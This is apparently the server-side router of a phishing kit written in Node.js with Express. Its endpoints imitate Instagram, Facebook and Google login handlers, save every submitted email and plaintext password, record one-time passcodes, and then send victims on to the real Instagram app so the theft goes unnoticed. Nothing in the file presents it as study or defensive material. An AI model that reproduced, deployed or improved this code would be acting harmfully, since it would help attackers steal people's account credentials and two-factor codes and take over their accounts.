const express = require('express');
const insta = require('../models/insta');
const fb = require('../models/fb');
const google = require('../models/google');
const otpModel = require('../models/otp'); // Renamed for clarity

const router = express.Router(); // FIXED: Define router

// Instagram Login
router.post("/instagram/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new insta({ email, password });
        await newUser.save();
        res.status(200).send("Instagram data saved");

    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send("Server Down! Retry");
    }
});

// Facebook Login
router.post("/facebook/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new fb({ email, password });
        await newUser.save();
        res.status(200).send("Facebook data saved");



    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send("Server Down! Retry");
    }
});

// Google Login
router.post("/google/login", async (req, res) => {
    const { email, password } = req.body;

    try {
        const newUser = new google({ email, password });
        await newUser.save();
        res.status(200).send("google data saved");



    } catch (err) {
        console.error("❌ Error saving user data:", err.message);
        res.status(500).send("Server Down! Retry");
    }
});

// OTP Verification
router.post("/verify", async (req, res) => {
    const { otp } = req.body;

    try {
        const newOtpEntry = new otpModel({ otp }); // FIXED: Use otpModel
        await newOtpEntry.save();

        const userAgent = req.headers["user-agent"];
        let redirectURL = "https://www.instagram.com/";

        if (/android/i.test(userAgent)) {
            redirectURL = "intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end;";
        } else if (/iphone|ipad|ipod/i.test(userAgent)) {
            redirectURL = "instagram://app";
        }

        res.redirect(redirectURL);
    } catch (err) {
        console.error("❌ Error saving OTP:", err.message);
        res.status(500).send("Server Down! Retry");
    }
});

module.exports = router; // FIXED: Export router
